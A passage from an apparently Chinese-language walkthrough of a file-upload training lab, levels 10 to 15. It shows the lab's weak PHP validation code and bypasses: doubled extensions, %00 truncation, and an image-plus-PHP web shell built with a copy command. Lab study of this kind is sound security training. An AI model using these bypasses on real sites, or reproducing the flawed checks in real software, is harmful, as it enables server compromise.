punctuation\">,</span><span class=\"token string double-quoted-string\">\"asa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"asax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ascx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ashx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"asmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"cer\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"swf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"htaccess\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>匹配到违法后缀会把它删除可以写两次后缀名绕过</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697634339512-02c52992-cda8-4f31-8449-2583f35f02f6.png\" alt=\"img\"></p>\n<p>上传成功</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697634354454-a85a5167-4c03-4836-92af-0976772cb3d8.png\" alt=\"img\"></p>\n<h3 id=\"白名单\"><a class=\"markdownIt-Anchor\" href=\"#白名单\">#</a> <span class=\"label warning\">白名单 </span></h3>\n<h4 id=\"第十一关\"><a class=\"markdownIt-Anchor\" href=\"#第十一关\">#</a> <span class=\"label warning\">第十一关</span></h4>\n<p>save_path 是一个可控的变量，后面还有一个后缀名需要绕过，这个时候需要使用 %00 截断，不过有使用条件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php版本小于5.3.4</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>php的magic_quotes_gpc为OFF状态</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> null<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>if<span class=\"token punctuation\">(</span>isset<span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> array<span class=\"token punctuation\">(</span><span class=\"token string\">'jpg'</span>,<span class=\"token string\">'png'</span>,<span class=\"token string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> substr<span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span>,strrpos<span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span>,<span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span>+1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    if<span class=\"token punctuation\">(</span>in_array<span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span>,<span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'save_path'</span><span class=\"token punctuation\">]</span>.<span class=\"token string\">\"/\"</span>.rand<span class=\"token punctuation\">(</span><span class=\"token number\">10</span>, <span class=\"token number\">99</span><span class=\"token punctuation\">)</span>.date<span class=\"token punctuation\">(</span><span class=\"token string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span>.<span class=\"token string\">\".\"</span><span class=\"token builtin class-name\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        if<span class=\"token punctuation\">(</span>move_uploaded_file<span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span>,<span class=\"token variable\">$img_path</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> else<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697636936295-56fa3cd9-6fac-4c57-bea3-670a4553477b.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697636949186-fdf7de71-0e73-41da-92b0-5e4e47cec4bc.png\" alt=\"img\"></p>\n<h4 id=\"第十二关\"><a class=\"markdownIt-Anchor\" href=\"#第十二关\">#</a> <span class=\"label warning\">第十二关</span></h4>\n<p>和第十一关对比，发现接受值变成了 post，那么思路就和第十一关一样，不过 post 方式不会自行解码，所以要对 %00 进行 urldecode 编码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_path'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"上传失败\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697637149425-0cfc1ccb-dcc7-49c3-94dc-287b91f621c1.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697637209122-cb135411-230f-4226-9dd1-bca3e070d760.png\" alt=\"img\"></p>\n<p>上传成功</p>\n<h4 id=\"第十三关-配合文件包含漏洞\"><a class=\"markdownIt-Anchor\" href=\"#第十三关-配合文件包含漏洞\">#</a> <span class=\"label warning\">第十三关 配合文件包含漏洞</span></h4>\n<p>图片码</p>\n<p>copy 13.jpg /b + 13.php /a a.jpg</p>\n<p>把 13.jpg 跟 13.php 组合成 a.jpg</p>\n<p>上传后文件包含漏洞会把所有文件当 php 解析</p>\n<p>地址加上 file</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697638638981-179639fb-f10a-48d5-8e96-a2ec26d4222d.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697638622025-f11ab8e5-0267-4999-8dc3-7b5d1c9be8c3.png\" alt=\"img\"></p>\n<h4 class=\"label warning\" id=\"第十四关\"><a class=\"markdownIt-Anchor\" href=\"#第十四关\">#</a> [第十四关]</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">isImage</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$types</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.jpeg|.png|.gif'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$info</span> <span class=\"token operator\">=</span> <span class=\"token function\">getimagesize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">image_type_to_extension</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$info</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$types</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">isImage</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"文件未知，上传失败！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"上传出错！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>getimagesize 是获取图片的大小，如果头文件不是图片会报错直接可以用图片马绕过检测。所以跟上面步骤一样</p>\n<h4 id=\"第十五关\"><a class=\"markdownIt-Anchor\" href=\"#第十五关\">#</a> <span class=\"label warning\">第十五关</span></h4>\n<p>查看源码 exif_imagetype () 读取一个图像的第一个字节并检查其签名需要打开 php_exif</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">isImage</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 需要开启 php_exif 模块</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$image_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">exif_imagetype</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$image_type</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token constant\">IMAGETYPE_GIF</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token constant\">IMAGETYPE_JPEG</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token constant\">IMAGETYPE_PNG</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span 